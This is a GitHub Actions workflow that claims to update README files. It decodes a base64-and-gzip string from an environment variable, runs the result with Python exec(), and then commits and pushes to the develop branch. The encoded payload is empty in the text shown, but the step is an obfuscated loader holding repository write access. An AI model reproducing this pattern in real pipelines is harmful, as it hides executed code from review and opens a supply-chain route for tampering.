name: Update README concepts

on:
  push:
    branches: [develop]
    paths:
      - .github/workflows/readme-concepts.yml

permissions:
  contents: write

jobs:
  update:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: develop

      - name: Explain BYOT and Humanize in all READMEs
        env:
          PATCH_B64: 
        run: |
          python - <<'PY'
          import base64, gzip, os
          code = gzip.decompress(base64.b64decode(os.environ["PATCH_B64"])).decode("utf-8")
          exec(compile(code, "<readme-patch>", "exec"))
          PY

      - name: Commit README improvements
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add README.md README.ja.md README.ko.md README.hi.md
          if git diff --cached --quiet; then
            echo "No README changes to commit."
            exit 0
          fi
          git commit -m "Explain BYOT and Humanize concepts"
          git push origin develop
